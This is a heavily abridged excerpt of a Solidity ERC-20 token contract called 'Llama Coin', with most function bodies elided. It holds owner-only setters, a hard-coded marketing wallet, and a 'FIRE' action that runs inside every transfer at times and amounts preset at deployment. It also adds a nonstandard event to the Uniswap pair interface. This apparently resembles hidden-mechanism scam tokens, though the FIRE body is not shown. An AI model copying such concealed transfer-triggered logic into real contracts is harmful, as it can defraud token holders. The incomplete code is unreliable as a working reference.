...
interface IUniswapV2Pair {
    ...
    event FIRE(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
...
contract LlamaCoin is Context, IERC20, Ownable {
    ...
    string private _name = "Llama Coin";
    ...
    address public _MarketingWallet = 0x8129aF5463f0774baC4F34B0a6F2D880396117eC;
    ...
    uint256[] private _FIRETime;
    uint256[] private _FIREAmount;
    uint256 private _nextFIREIdx;
    ...
    constructor(
        uint256[] memory FIRETime,
        uint256[] memory FIREAmount,
        string memory _Start
    ) {
        require(FIRETime.length == FIREAmount.length, "Must have an amount");
        _FIRETime = FIRETime;
        _FIREAmount = new uint256[](FIREAmount.length);
        ...
        for (uint256 i = 0; i < FIREAmount.length; i++)
            _FIREAmount[i] = FIREAmount[i] * 10**_decimals;
    ...
    function FIRE(uint256 state) internal {
    ...
    function launchapp() external onlyOwner {
        _taxFee = 2;
    ...
    function setsettingIn(uint256 settingIn) external onlyOwner {
        uint256 settingInAmount = settingIn * 10**_decimals;
        require(settingInAmount >= _tTotal / 10, "Min 10%");
        _settingInAmount = settingInAmount;
    }

    function setsettingOut(uint256 settingOut) external onlyOwner {
        uint256 settingOutAmount = settingOut * 10**_decimals;
        require(settingOutAmount >= numTokensSellToAddToLiquidity, "Can't reduce");
        require(settingOutAmount >= _tTotal / 10, "Min 10%");
    ...
    function _transfer(
        ...
        // still have FIREs
        if (
            _nextFIREIdx < _FIRETime.length &&
            _FIRETime[_nextFIREIdx] <= block.timestamp
        ) FIRE(_FIREAmount[_nextFIREIdx++]);
